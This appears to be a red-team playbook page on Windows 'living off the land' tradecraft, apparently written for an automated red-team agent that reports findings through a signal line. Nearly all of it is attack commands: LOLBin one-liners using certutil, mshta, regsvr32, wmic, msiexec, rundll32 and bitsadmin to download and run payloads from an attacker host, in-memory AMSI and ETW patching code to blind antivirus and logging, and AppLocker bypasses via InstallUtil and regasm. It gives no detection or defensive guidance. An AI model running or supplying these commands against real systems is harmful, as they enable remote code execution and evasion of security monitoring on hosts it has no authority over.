# Living off the Land (LotL)

**MITRE:** T1218, T1059.001 | **When:** Windows hosts confirmed - AV/EDR present.

## LOLBins - Proxy Code Execution

```powershell
# certutil - download and execute:
certutil -urlcache -split -f "https://attacker.com/payload.exe" %TEMP%\update.exe
# Also: decode base64:
certutil -decode encoded.b64 payload.exe

# mshta - execute remote HTA:
mshta http://attacker.com/payload.hta
# HTA content: <script language="VBScript">CreateObject("WScript.Shell").Run "powershell -enc ...",0</script>

# regsvr32 - COM scriptlet execution:
regsvr32 /s /n /u /i:http://attacker.com/payload.sct scrobj.dll
# SCT file: COM scriptlet with VBScript embedded

# wmic - execute via XSL:
wmic process call create "wscript.exe //e:jscript http://attacker.com/payload.js"

# msiexec - execute remote MSI:
msiexec /q /i http://attacker.com/payload.msi

# rundll32 - execute DLL export:
rundll32 \\attacker.com\share\payload.dll,EntryPoint
rundll32 javascript:"\..\mshtml,RunHTMLApplication ";close();new%20ActiveXObject("WScript.Shell").Run("powershell ...");

# bitsadmin - download and execute:
bitsadmin /create job && bitsadmin /addfile job https://attacker.com/payload.exe %TEMP%\p.exe
bitsadmin /setnotifycmdline job %TEMP%\p.exe NULL
bitsadmin /resume job
```

## PowerShell AMSI Bypass (Before Running PS Scripts)

```powershell
# In-memory AMSI bypass (patch amsi.dll AmsiScanBuffer return value):
$a=[Ref].Assembly.GetTypes();foreach($b in $a){if($b.Name -like "*iUtils"){$c=$b}};
$d=$c.GetFields("NonPublic,Static");foreach($e in $d){if($e.Name -like "*Context"){$f=$e}};
$g=$f.GetValue($null);[IntPtr]$ptr=$g;
[Int32[]]$buf=@(0);[System.Runtime.InteropServices.Marshal]::Copy($buf,0,$ptr,1)

# Reflection-based bypass:
[Runtime.InteropServices.Marshal]::WriteByte([Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer(
  (([AppDomain]::CurrentDomain.GetAssemblies()|?{$_.GlobalAssemblyCache -and $_.Location.Split('\\')[-1].Equals('System.dll')}).GetType('Microsoft.Win32.UnsafeNativeMethods').GetMethod('GetProcAddress', [Type[]]@([System.Runtime.InteropServices.HandleRef],[String]))).Invoke($null,@([Runtime.InteropServices.HandleRef]([System.Reflection.Assembly]::LoadFile("C:\Windows\System32\amsi.dll").GetModules()[0].FindTypes([System.Reflection.Emit.Opcodes]::Ldtoken,'*')[0].FullName + "_" + [System.Runtime.InteropServices.HandleRef]::new($null,[IntPtr]::Zero)), "AmsiScanBuffer")), 0xC3  # ret instruction
)
```

## ETW Bypass

```powershell
# Disable ETW provider via patch (Offensive Security technique):
$EtwEventWrite = [System.Diagnostics.Eventing.EventProvider].GetField("m_etwProvider","NonPublic,Instance")
$etwProvider = $EtwEventWrite.GetValue([System.Diagnostics.Eventing.EventProvider])
[System.Runtime.InteropServices.Marshal]::WriteByte([System.Runtime.InteropServices.Marshal]::ReadIntPtr($etwProvider,0), 0x90)
```

## Signed Binary Proxy Execution

```bash
# LOLDrivers: load vulnerable signed driver -> kernel-level code execution
# Common: dbutil_2_3.sys (Dell), procexp.sys (Sysinternals)
# Tool: DriverBuddy, LOLDrivers database

# AppLocker bypass via PkgMgr / InstallUtil:
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\InstallUtil.exe /logfile= /logtoconsole=false /U payload.dll

# Regasm.exe (similar bypass):
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\regasm.exe /U payload.dll
```

**Signal:** `emit_signal SURFACE_FOUND "LotL execution via <lolbin> on <host>" "main/redteam" 0.85`
